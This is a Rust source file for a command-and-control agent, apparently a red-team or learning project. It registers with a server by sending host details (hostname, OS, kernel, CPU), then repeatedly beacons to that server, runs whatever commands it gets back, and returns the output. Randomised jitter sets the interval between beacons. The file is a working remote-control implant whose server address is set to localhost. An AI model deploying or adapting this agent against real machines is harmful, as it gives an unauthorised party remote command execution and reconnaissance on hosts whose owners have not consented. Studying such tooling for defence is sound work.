mod commands;
mod config;
mod logging;
mod systeminfo;

use crate::commands::{
    execute_command
};
use crate::systeminfo::{
    SystemInfo, get_system_info
};
use crate::config::{
    AgentConfig
};
use common::schema::{
    Command, CommandResult
};
use chrono::{Local, DateTime};
use rand::RngExt;
use serde_json::json;
use std::time::Duration;

#[derive(Debug)]
struct Agent {
    id: u32,
    client: reqwest::Client,
    results: Vec<CommandResult>,
    config: AgentConfig,
    system_info: SystemInfo,
}

impl Agent {
    pub async fn new(config: AgentConfig) -> Result<Self, reqwest::Error> {
        let register_url = format!("{}/register", config.server_url);
        let system_info = get_system_info();
        let client = reqwest::Client::new();

        // Register agent and get id
        let id: u32 = client
            .post(register_url)
            .json(&json!({
                "name": config.name,
                "system_name": system_info.system_name,
                "hostname": system_info.hostname,
                "os": system_info.os,
                "os_version": system_info.os_version,
                "kernel_version": system_info.kernel_version,
                "cpu": system_info.cpu,
            }))
            .send()
            .await?
            .error_for_status()?
            .json()
            .await?;

        Ok(Self {
            id,
            client,
            results: Vec::new(),
            config,
            system_info
        })
    }

    // Run agent loop (beacon -> execute commands -> repeat)
    pub async fn run(&mut self) -> Result<(), reqwest::Error> {
        let bottom_duration_range = self.config.beacon_duration_sec - self.config.duration_range_sec;
        let top_duration_range = self.config.beacon_duration_sec + self.config.duration_range_sec;
        let beacon_url = format!("{}/beacon", self.config.server_url);

        loop {
            logln!("Beaconed server");
            // Beacon to server (send results)
            let commands: Vec<Command> = self.client.post(&beacon_url)
                .json(&json!({ 
                    "id": self.id,
                    "results": self.results
                }))
                .send()
                .await?
                .error_for_status()?
                .json::<Vec<Command>>()
                .await?;
            
            // Clear results
            self.results.clear();

            // Execute commands
            for command in commands.iter() {
                let res = CommandResult {
                    command_id: command.id.clone(),
                    result: execute_command(command.cmd.clone())
                };
                logln!("Received command - {:?}", command);
                self.results.push(res);
            }

            // Randomize time until next beacon
            let mut rng = rand::rng();
            let sleep_duration = rng.random_range(bottom_duration_range..top_duration_range);
            tokio::time::sleep(Duration::from_secs(sleep_duration)).await;
        }
    }
}

#[tokio::main]
async fn main() {
    let config = AgentConfig {
        name: "a1111".to_string(),
        server_url: "http://localhost:8080".to_string(),
        beacon_duration_sec: 10,
        duration_range_sec: 3,
    };
    let mut agent = Agent::new(config).await.unwrap();
    agent.run().await.unwrap();

    println!("{:#?}", agent);
}
